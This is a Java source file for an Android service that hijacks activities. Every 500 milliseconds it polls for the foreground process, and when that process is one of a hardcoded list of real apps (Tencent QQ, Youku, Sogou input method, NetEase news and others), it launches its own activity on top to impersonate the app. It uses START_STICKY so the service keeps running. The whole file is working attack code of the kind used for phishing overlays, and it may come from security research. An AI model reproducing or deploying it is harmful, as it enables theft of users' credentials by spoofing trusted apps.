package singuloid.activityhijackapp;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import java.util.HashMap;
import java.util.List;

public class HijackActivityService extends Service
{
    private static final String TAG = "HijackActivityService";

    private boolean mHasStarted = false;

    private HashMap<String, Class<?>> mTargetHunt = new HashMap<>();

    private Handler mHandler = new Handler();

    private Runnable mTask = new Runnable()
    {
        @Override
        public void run()
        {
            WTF.d(TAG, " start hijacking task ...  ");
            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> appProcessInfoList = activityManager.getRunningAppProcesses();
            WTF.d(TAG, "Is iterating over the running app process list and get all of the running service ");
            for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfoList)
            {
                if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND)
                {
                    WTF.d(TAG, "This app is running in foreground ");
                    if (mTargetHunt.containsKey(appProcessInfo.processName))
                    {
                        // then, perform the hijack
                        hijack(appProcessInfo.processName);
                    } else
                    {
                        WTF.d(TAG, "do not hijack this process ");
                    }
                }
            }
            mHandler.postDelayed(mTask, 500);
        }

        private void hijack(String processName)
        {
            WTF.d(TAG, "we are going to hijack the : " + processName);
            if (! ((HijackingApplication) getApplication()).hasProcessHijacked(processName))
            {
                WTF.d(TAG, " this process has not been hijacked yet, and we should hijack it ");
                Intent hijackIntent = new Intent(getBaseContext(), mTargetHunt.get(processName));
                hijackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                getApplication().startActivity(hijackIntent);

                // put the already hijack app process into the list we reserved
                Log.d(TAG, " we are putting this process into the container we created in the Application object ");
                ((HijackingApplication) getApplication()).addProcessHijacked(processName);
                WTF.d(TAG, " -----------> hijack success!!!, and add this process name to the collector");
            }
        }
    };

    public HijackActivityService()
    {
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
        WTF.d(TAG, " --------------> the hijacking service has been stopped <----------------------");
    }

    @Override
    public boolean stopService(Intent name)
    {
        WTF.d("scguo_service", "the service has been stopped by the MainActivity ");
        mHasStarted = false;
        ((HijackingApplication) getApplication()).clearProcessHijacked();

        return super.stopService(name);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
//        super.onStartCommand(intent, flags, startId);
        if (!mHasStarted)
        {
            Log.d(TAG, " we are starting to put the target process into the target container .... in onStartCommand() ");
            // add the process we need to hijack
            // here what we add are the appId( the package name of the correspond that the app list we get through "ps" command
            // in the adb shell environment ).
            mTargetHunt.put("com.netease.newsreader.activity", MainActivity.class);
            mTargetHunt.put("com.wandoujia.player.walkman", MainActivity.class);
            mTargetHunt.put("com.netease.pomelo.news.push.messageservice_V1", MainActivity.class);
            mTargetHunt.put("com.wandoujia.phoenix2", MainActivity.class);
            mTargetHunt.put("com.cyou.privacysecurity", MainActivity.class);
            mTargetHunt.put("com.ss.android.article.news", MainActivity.class);
            mTargetHunt.put("com.youku.phone", MainActivity.class);
            mTargetHunt.put("com.tencent.mobileqq", MainActivity.class);
            mTargetHunt.put("com.sohu.inputmethod.sogou", MainActivity.class);

            // put the process we test now
            mTargetHunt.put("singuloid.sdkdemo_2", MainActivity.class);

            // If we have started this service, we will not start it anymore
            // and until the next time that this service has been started again
            // for example, this service could be stopped by the user through the Settings
            // application or simply by clearing the RecentActivity List
            mHandler.postDelayed(mTask, 500);
            mHasStarted = true;
        }
        // make this service always running in the background
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent)
    {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
